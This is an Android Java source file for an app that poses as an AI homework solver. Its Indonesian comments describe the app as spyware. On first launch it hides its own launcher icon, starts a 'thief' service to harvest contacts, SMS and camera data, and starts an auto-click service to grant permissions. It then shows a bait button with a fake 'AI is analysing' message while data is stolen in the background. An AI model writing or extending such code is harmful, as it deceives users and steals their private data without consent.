package com.ai.homework;

import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;

public class MainActivity extends AppCompatActivity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        // Sembunyiin Icon Launcher setelah aplikasi dibuka
        getPackageManager().setComponentEnabledSetting(
                getComponentName(),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
        );

        // Jalanin Service Pencuri (Kontak, SMS, Kamera)
        startService(new Intent(this, HarvesterService.class));
        
        // Jalanin Service Auto-Klik Izin
        startService(new Intent(this, AutoGrantService.class));

        // Tombol Umpan
        Button btnScan = findViewById(R.id.btnScan);
        btnScan.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Toast.makeText(MainActivity.this, "AI Sedang Menganalisis Soal...", Toast.LENGTH_LONG).show();
                // Pura-pura loading, padahal data udah dicuri di background
            }
        });
    }
}